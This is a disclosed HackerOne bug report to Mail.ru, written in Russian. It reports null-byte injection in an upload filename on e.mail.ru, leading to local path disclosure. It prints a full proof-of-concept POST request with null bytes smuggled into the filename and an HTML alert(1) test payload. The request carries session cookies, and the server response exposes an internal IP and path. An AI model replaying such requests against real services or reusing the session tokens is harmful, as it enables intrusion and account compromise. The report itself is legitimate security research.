@@ -1,0 +1,101 @@
+ReportLink:https://hackerone.com/reports/20616
+WeaknessName:Memory Corruption - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:03:27
+
+Summary:
+
+Начинаем пихать зиробайты в имя файла на загрузке и поведение сервера неадекватно.
+Пока ничего страшнее чем local path disclosure, но боюсь импакт больше чем кажется.
+
+В имени файла в примере "������t123123", в хексе "220000000000007431323331323322"
+
+POST /cgi-bin/attach_upload2?ajax_call=1&x-email=isox@inbox.ru&rnd=1405701066960 HTTP/1.1
+Host: e.mail.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: https://e.mail.ru/compose/?1405701035629
+Content-Length: 1437
+Content-Type: multipart/form-data; boundary=---------------------------1458149202302584501747628458
+Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nF:; s=fver=14|geo=2582|georb=70|geol1=188; i=AQAmDclTBwATAAgiC3QAASMBAWQBAY8BARkCAe4CAbkDAdwEAvQEAQAGARonAV0ABQIB/6gACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAf3vAQgEAQEAAVgDCAQBAQAB; b=jD8UAHB0YwQA4u8pQe9rWQi/mAe4+pTg1rwiEPCmA+3edPDdmw64e9MBeG86BAAAhEw/FPFFRyJGlQPChZdCWBstCPcjCeGgsCKU0pGEcZ6WgLexAAL+Fw8RYV88JOgjmgOhE3YqwvhBJgkj2xJlkPvAlbCb3yrCHu7QGGSjmCWYsy6SYD7WFYLJqSoIPdC0IAAA; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAID3gcA; sdcs=SflzEPxh1V8Jupa2; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=qkvJUwAAABotDgATAQAA8wAAAQAA; mc1=1405701050; optimizelySegments=%7B%221363374953%22%3A%22direct%22%2C%221379862954%22%3A%22ff%22%2C%221356673191%22%3A%22false%22%7D; optimizelyEndUserId=oeu1404747734356r0.5230243679244354; optimizelyBuckets=%7B%7D; Mpop=1405700928:5f75466279787a7d19050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; mc2=parapa.mail.ru; mr1ladid=1_1000043_1000475_0; HTML5Uploader=2; gmt=4
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="Filedata"; filename="������t123123"
+Content-Type: image/jpeg
+
+<html><script>alert(1);</script></html>
+
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="swf"
+
+1
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="fuid"
+
+yarrrr
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="url_charset"
+
+utf-8
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="FileName"
+
+1px_html.jpg
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="message"
+
+test�test
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="groupcode"
+
+
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="upmode"
+
+contextflash
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="upload"
+
+1
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="sourcehost"
+
+gmail.com
+-----------------------------1458149202302584501747628458
+Content-Disposition: form-data; name="hidelinkcode"
+
+1
+-----------------------------1458149202302584501747628458--
+
+
+
+
+На выхлопе сервер дает: 
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 18 Jul 2014 17:16:03 GMT
+Content-Type: application/json; charset=utf-8
+Connection: keep-alive
+X-Frame-Options: SAMEORIGIN
+X-Host: f312.i.mail.ru
+X-XSS-Protection: 0
+X-ETime: 0.565
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=16070400
+Content-Security-Policy: default-src *.mail.ru *.imgsmail.ru *.attachmail.ru *.live.com *.youtube.com *.youtube.ru *.youtu.be *.rutube.ru *.vimeo.com *.smotri.com *.dailymotion.com *.rambler.ru *.ivi.ru *.videomore.ru *.gemius.pl *.weborama.fr *.adriver.ru *.serving-sys.com *.mradx.net;script-src 'unsafe-inline' 'unsafe-eval' *.mail.ru *.imgsmail.ru *.yandex.ru *.odnoklassniki.ru *.youtube.com *.dailymotion.com *.vimeo.com *.scorecardresearch.com; img-src *; style-src 'unsafe-inline'  'unsafe-eval' *.mail.ru *.imgsmail.ru; font-src data: *.imgsmail.ru; report-uri https://cspreport.mail.ru/;
+Content-Length: 161
+
+
+["AjaxResponse","OK","UPLOADED",{"FileName":"",partID:"10.161.54.12:/var/tmp/mpop/upload/ATT1405703762.17665","Id":"9reg8qFDJlN9PxL8","SpaceLeft":26337280}]
+
